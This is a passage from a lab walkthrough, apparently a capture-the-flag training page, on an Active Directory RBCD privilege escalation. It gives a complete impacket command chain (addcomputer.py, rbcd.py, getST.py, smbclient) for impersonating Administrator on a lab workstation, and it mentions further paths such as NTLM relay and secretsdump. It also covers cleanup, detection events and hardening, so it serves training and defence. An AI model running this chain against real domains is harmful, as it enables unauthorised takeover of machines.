+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>4. Use the TGS to mount C$ on the target as Administrator
+</code></pre></div>
+<p>The chain is four commands. Each is well-documented in impacket. The combination is one of the most common AD privesc paths discovered in modern internal pentests.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="verify-machineaccountquota">Verify MachineAccountQuota</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span><span class="s2">&quot;(objectClass=*)&quot;</span><span class="w"> </span>ms-DS-MachineAccountQuota
+</code></pre></div>
+<p>Or with netexec:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netexec<span class="w"> </span>ldap<span class="w"> </span>corp-dc01<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>-M<span class="w"> </span>maq
+</code></pre></div>
+<h3 id="create-a-controlled-computer-account">Create a controlled computer account</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>addcomputer.py<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;fakectrl_&lt;token&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-computer-pass<span class="w"> </span><span class="s1">&#39;AttackerPwd2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-dc-host<span class="w"> </span>corp-dc01<span class="w"> </span>-domain-netbios<span class="w"> </span>CORP<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>corp.nordport.local/j.chen:<span class="s1">&#39;Welcome2026#&#39;</span>
+</code></pre></div>
+<p>The trailing <code>$</code> in computer SAM accounts is added automatically by impacket. The account is enabled with the password you specify.</p>
+<h3 id="write-rbcd-attribute">Write RBCD attribute</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s2">&quot;fakectrl_&lt;token&gt;</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>-delegate-to<span class="w"> </span><span class="s2">&quot;WS-FIN-&lt;TOKEN&gt;</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc&gt;<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">  </span>corp.nordport.local/j.chen:<span class="s1">&#39;Welcome2026#&#39;</span>
+</code></pre></div>
+<p>To remove later:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>rbcd.py<span class="w"> </span>...<span class="w"> </span>-action<span class="w"> </span>remove
+</code></pre></div>
+<h3 id="s4u2self-s4u2proxy-as-the-controlled-computer">S4U2self + S4U2proxy as the controlled computer</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s2">&quot;cifs/WS-FIN-&lt;TOKEN&gt;.corp.nordport.local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span><span class="s2">&quot;corp.nordport.local/fakectrl_&lt;token&gt;\$:AttackerPwd2026#&quot;</span>
+</code></pre></div>
+<p>Note the escaped <code>\$</code> in the SAM (<code>fakectrl_&lt;token&gt;$</code>); shell escaping varies. The output ccache is named after the impersonated user.</p>
+<h3 id="use-the-ticket">Use the ticket</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>smbclient<span class="w"> </span>//WS-FIN-&lt;TOKEN&gt;.corp.nordport.local/C$<span class="w"> </span>-k<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;ls; get rbcd_flag_&lt;token&gt;.txt&quot;</span>
+</code></pre></div>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-verify-machineaccountquota">Step 1: Verify MachineAccountQuota</h3>
+<p><code>ms-DS-MachineAccountQuota</code> lives on the domain naming context root and applies to every authenticated user. The <code>-s base</code> scope plus an empty filter <code>(objectClass=*)</code> returns just the root object's attributes. Any non-zero value enables the rest of the chain.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Confirm MAQ &gt;= 1</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">  </span><span class="s2">&quot;(objectClass=*)&quot;</span><span class="w"> </span>ms-DS-MachineAccountQuota
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-s base</code></td>
+<td>Search scope: just the base DN, no children.</td>
+</tr>
+<tr>
+<td><code>(objectClass=*)</code></td>
+<td>Match any object (the only object at base scope is the root).</td>
+</tr>
+<tr>
+<td><code>ms-DS-MachineAccountQuota</code></td>
+<td>Trailing attribute; only this attribute returned.</td>
+</tr>
+</tbody>
+</table>
+<p>A value of 10 (the Microsoft default) means each user can create up to 10 computer accounts. Anything &gt; 0 is sufficient for this exercise. A value of 0 means the chain breaks at Step 2; you would need to compromise an existing computer account instead.</p>
+</div>
+<h3 id="step-2-create-the-controlled-computer-account">Step 2: Create the Controlled Computer Account</h3>
+<p><code>addcomputer.py</code> calls SAMR's <code>SamrCreateUser2InDomain</code> to create a computer-class user object. The MAQ check happens server-side; if you have not exhausted your 10-account quota, the create succeeds. The new account's password is whatever you supply on the command line.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - addcomputer.py</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>addcomputer.py<span class="w"> </span>-computer-name<span class="w"> </span><span class="s2">&quot;fakectrl_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-computer-pass<span class="w"> </span><span class="s1">&#39;AttackerPwd2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">  </span>-dc-host<span class="w"> </span>corp-dc01<span class="w"> </span>-domain-netbios<span class="w"> </span>CORP<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">  </span><span class="s2">&quot;corp.nordport.local/j.chen:Welcome2026#&quot;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-computer-name</code></td>
+<td>SAM name (without trailing <code>$</code>); impacket appends it.</td>
+</tr>
+<tr>
+<td><code>-computer-pass</code></td>
+<td>Initial password for the account.</td>
+</tr>
+<tr>
+<td><code>-dc-host</code></td>
+<td>DC hostname (used for SMB to the DC).</td>
+</tr>
+<tr>
+<td><code>-domain-netbios</code></td>
+<td>NetBIOS domain name (capitalized).</td>
+</tr>
+<tr>
+<td><code>&lt;realm&gt;/&lt;user&gt;:&lt;pw&gt;</code></td>
+<td>Authenticate as this domain user.</td>
+</tr>
+</tbody>
+</table>
+<p>On success the message says the computer account was created. Verify by authenticating as it (the <code>\$</code> escapes the <code>$</code> from shell interpretation):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span>corp-dc01<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;fakectrl_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>-p<span class="w"> </span><span class="s1">&#39;AttackerPwd2026#&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.nordport.local
+</code></pre></div>
+</div>
+<h3 id="step-3-write-the-rbcd-attribute">Step 3: Write the RBCD Attribute</h3>
+<p><code>rbcd.py write</code> modifies <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target. The attribute is a binary security descriptor; impacket reads any existing value, appends the source's SID, and writes the new descriptor back. The DC checks j.chen's effective rights on the target's attribute; the WriteProperty grant from IT_HelpDesk membership permits the modification.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - rbcd.py write</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;a-z&#39;</span><span class="w"> </span><span class="s1">&#39;A-Z&#39;</span><span class="k">)</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s2">&quot;fakectrl_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">        </span>-delegate-to<span class="w"> </span><span class="s2">&quot;WS-FIN-</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">        </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">        </span><span class="s2">&quot;corp.nordport.local/j.chen:Welcome2026#&quot;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-delegate-from</code></td>
+<td>The source account that will be allowed to delegate.</td>
+</tr>
+<tr>
+<td><code>-delegate-to</code></td>
+<td>The target computer whose attribute is being modified.</td>
+</tr>
+<tr>
+<td><code>-action write</code></td>
+<td>Add the source SID; <code>read</code> queries; <code>remove</code> undoes.</td>
+</tr>
+<tr>
+<td><code>-dc-ip &lt;ip&gt;</code></td>
+<td>DC IP.</td>
+</tr>
+</tbody>
+</table>
+<p>Successful output reports the new RBCD entry. To verify the write landed:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>rbcd.py<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s2">&quot;WS-FIN-</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">        </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">        </span><span class="s2">&quot;corp.nordport.local/j.chen:Welcome2026#&quot;</span>
+</code></pre></div>
+</div>
+<h3 id="step-4-s4u2self-s4u2proxy">Step 4: S4U2self + S4U2proxy</h3>
+<p>With <code>fakectrl_&lt;token&gt;$</code> listed in the target's RBCD attribute, the same getST.py flow used in 4.4 now works against this target. The KDC validates the source SID against the target's attribute (rather than against the source's <code>msDS-AllowedToDelegateTo</code>); both validate paths converge on issuing a usable TGS.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - getST.py from controlled account</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">cd</span><span class="w"> </span>~/work<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>adpt-4-05<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>adpt-4-05
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;a-z&#39;</span><span class="w"> </span><span class="s1">&#39;A-Z&#39;</span><span class="k">)</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s2">&quot;cifs/WS-FIN-</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">.corp.nordport.local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">         </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">         </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">         </span><span class="s2">&quot;corp.nordport.local/fakectrl_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\$:AttackerPwd2026#&quot;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-spn &lt;svc&gt;/&lt;host&gt;.&lt;realm&gt;</code></td>
+<td>Target service. Must match how SMB derives the SPN.</td>
+</tr>
+<tr>
+<td><code>-impersonate &lt;user&gt;</code></td>
+<td>The user identity that will appear in the issued ticket.</td>
+</tr>
+<tr>
+<td><code>&lt;realm&gt;/&lt;computer&gt;$:&lt;pw&gt;</code></td>
+<td>Source authentication; computer accounts use the trailing <code>$</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>The output is <code>Administrator.ccache</code>.</p>
+</div>
+<h3 id="step-5-read-the-flag">Step 5: Read the Flag</h3>
+<p>The ccache contains a TGS for <code>cifs/WS-FIN-&lt;token&gt;</code> issued to Administrator. SMB uses it transparently when <code>KRB5CCNAME</code> points at the file. The target's CIFS service authenticates the request as Administrator, who has full read on <code>C$</code>.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - SMB to the target as Administrator</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>klist
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>smbclient<span class="w"> </span><span class="s2">&quot;//WS-FIN-</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">.corp.nordport.local/C</span>$<span class="s2">&quot;</span><span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;get rbcd_flag_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">.txt&quot;</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>cat<span class="w"> </span>rbcd_flag_<span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span>.txt
+</code></pre></div>
+<p>Submit the OCR{...} value.</p>
+</div>
+<h3 id="step-6-cleanup">Step 6: Cleanup</h3>
+<p>Two artifacts were created: the RBCD entry on the target and the controlled computer account itself. Remove both. Order does not matter for cleanup; either can come first.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Remove RBCD entry and computer account</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s2">&quot;fakectrl_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">        </span>-delegate-to<span class="w"> </span><span class="s2">&quot;WS-FIN-</span><span class="si">${</span><span class="nv">TOK</span><span class="si">}</span><span class="s2">\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">        </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span>-action<span class="w"> </span>remove<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">        </span><span class="s2">&quot;corp.nordport.local/j.chen:Welcome2026#&quot;</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">  </span>remove<span class="w"> </span>object<span class="w"> </span><span class="s2">&quot;fakectrl_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">\$&quot;</span>
+</code></pre></div>
+<p>The computer account belongs to j.chen (its <code>mS-DS-CreatorSID</code> is j.chen's SID), so j.chen has implicit delete rights regardless of any DACL.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong>MAQ exhausted</strong>: re-running addcomputer.py with the same name on a different attempt counts toward the quota even if the prior account was deleted (the count is creation-side, not present-state). Use a different <code>-computer-name</code> if you exhaust 10.</li>
+<li><strong>Wrong target case</strong>: <code>WS-FIN-J001$</code> and <code>ws-fin-j001$</code> resolve to the same object in LDAP, but <code>getST.py -spn</code> and <code>smbclient //...</code> are case-sensitive on the host portion. Stick with uppercase consistently.</li>
+<li><strong>Shell <code>$</code> expansion</strong>: bash treats <code>$WORD</code> as a variable. Always escape the trailing <code>$</code> in computer SAMs as <code>\$</code> or quote the whole string with single quotes.</li>
+<li><strong>LDAP signing required</strong>: if the domain enforces LDAP signing, the rbcd.py SASL bind must be properly negotiated. Add <code>-k</code> to use Kerberos instead of NTLM if the simple bind fails.</li>
+<li><strong>Cleanup forgotten</strong>: leaving fakectrl_<token>$ behind exhausts your MAQ over time. Always remove it.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>Three distinct events fire across the chain. None alone is high-signal; the combination from one source IP across two minutes is.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Where it fires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Computer account created (MAQ=10)</td>
+<td>4741</td>
+<td>DC Security log</td>
+</tr>
+<tr>
+<td>RBCD attribute written</td>
+<td>5136 (msDS-AllowedToActOnBehalfOfOtherIdentity)</td>
+<td>DC Security log</td>
+</tr>
+<tr>
+<td>S4U2proxy issued</td>
+<td>4769 with <code>cname-in-pa-data</code> ticket option</td>
+<td>DC Security log</td>
+</tr>
+<tr>
+<td>Auth as Administrator on target</td>
+<td>4624 logon type 3</td>
+<td>Target host log</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">How RBCD differs from classic CD detection</p>
+<p>Classic constrained delegation has a tight detection on <code>SeEnableDelegationPrivilege</code> use; RBCD has no such privilege gate, so detection has to live in the attribute write itself. SIEM rule that catches RBCD reliably: alert on event 5136 where <code>Object Class = computer</code> and <code>Attribute LDAP Display Name = msDS-AllowedToActOnBehalfOfOtherIdentity</code> from any non-Tier-0 principal. Volume is low; signal is high.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>RBCD is a legitimate Windows servicing primitive; you cannot ban it. You harden the conditions that make it abusable.</p>
+<div class="admonition tip">
+<p class="admonition-title">Practical RBCD hardening</p>
+<ul>
+<li>Set <code>ms-DS-MachineAccountQuota = 0</code> and grant computer creation only to a dedicated provisioning account.</li>
+<li>Audit <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> weekly across all computer objects; baseline the legitimate entries.</li>
+<li>Tighten ACLs on workstation OUs: helpdesk groups should have specific extended rights, not GenericWrite.</li>
+<li>Mark Tier-0 accounts with <code>Account is sensitive and cannot be delegated</code> (<code>NOT_DELEGATED</code> UAC bit).</li>
+<li>Enforce <strong>LDAP signing and channel binding</strong> to break NTLM-relay-to-LDAP RBCD chains.</li>
+<li>Build SIEM detection on event 5136 for the RBCD attribute.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>Target computer:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>WS-FIN-&lt;TOKEN&gt;
+</code></pre></div>
+<p><strong>Created controlled account:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>fakectrl_&lt;token&gt;$  (password: AttackerPwd2026#)
+</code></pre></div>
+<p><strong>RBCD entry written:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>fakectrl_&lt;token&gt;$ -&gt; WS-FIN-&lt;TOKEN&gt;
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>(OCR{rbcd_...})
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The classic constrained delegation attribute requires <code>SeEnableDelegationPrivilege</code> to write. Why doesn't RBCD's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> have a similar protection?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>RBCD was designed to support modern Windows Server features (cluster failover, IIS app-pool delegation, AD FS) where the target resource needs to declare its own delegation trust without needing a Tier-0 administrator to make the change every time. The attribute is therefore writeable via standard ACLs (WriteProperty), which is convenient for legitimate distributed Windows applications but easy to abuse: any helpdesk group with GenericWrite over a workstation OU now effectively has the right to take over every workstation in that OU. Microsoft considered the trade-off acceptable because the modern Windows servicing model assumes the target resource's administrator (which for workstations is typically the local IT team) should be allowed to declare delegation trust. The defender mitigation is to ensure no group with broad workstation-OU rights includes accounts that should not be effective local admin everywhere.</p>
+</details>
+<p><strong>2. The default <code>ms-DS-MachineAccountQuota = 10</code> is the enabling condition. What breaks if a defender sets it to 0?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Self-service domain join breaks. A user who runs the "Add this computer to the domain" wizard on a freshly imaged workstation needs the right to create a computer account; the default quota of 10 supports that without administrative intervention. Setting MAQ to 0 forces every domain join to be performed by an administrator (or a delegated account explicitly granted the <code>Create Computer Objects</code> extended right on the target OU). Many enterprises with mature provisioning automation set MAQ to 0 because their MDT / Intune / SCCM workflows handle domain join via a dedicated service account; the convenience of self-service is not needed. Smaller organizations leave the default and accept the RBCD risk. The defender's compromise: set MAQ to 0 and grant <code>Create Computer Objects</code> to a specific provisioning service account that lives in a tightly-controlled OU.</p>
+</details>
+<p><strong>3. The attack works because we control the source account's password (we just created it). What if MAQ is 0 and we cannot create a computer? Are there other paths to RBCD exploitation?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Yes. Three alternative source-account acquisitions: (a) compromise an existing computer account by other means; machine accounts have the same delegation capabilities as user accounts, and pulling a machine secret via <code>secretsdump.py -system</code> or via <code>mimikatz lsadump::secrets</code> from a compromised host yields a usable source. (b) Compromise a service account (Kerberoast, ASREPRoast, GenericAll-then-reset). (c) Use coerced authentication from a target machine to the attacker's listener; the captured Net-NTLM hash can be relayed to LDAP to write the RBCD attribute as the coerced computer's identity. The relayed-to-LDAP-then-RBCD-then-S4U flow is documented in CVE-2019-1040 era write-ups and remains effective when LDAP signing is not enforced. Setting MAQ to 0 closes the easiest path; the RBCD primitive itself remains exploitable through these alternatives until the defender hardens the underlying ACL paths.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>RBCD reverses the trust direction: target declares trust; source impersonates.</li>
+<li>The trigger is <code>WriteProperty</code> on the target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>, not the rare <code>SeEnableDelegationPrivilege</code>.</li>
+<li><code>ms-DS-MachineAccountQuota = 10</code> lets any user create the source account they need.</li>
+<li>Four-tool chain: <code>addcomputer.py</code> -&gt; <code>rbcd.py write</code> -&gt; <code>getST.py</code> -&gt; <code>smbclient -k</code>.</li>
+<li>Mitigation: <code>MAQ=0</code> plus tightly-scoped helpdesk ACLs on workstation OUs; LDAP signing enforced.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below cover the entire RBCD chain. Memorize the order; this attack still works in 2026 against most internal environments.</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command</th>
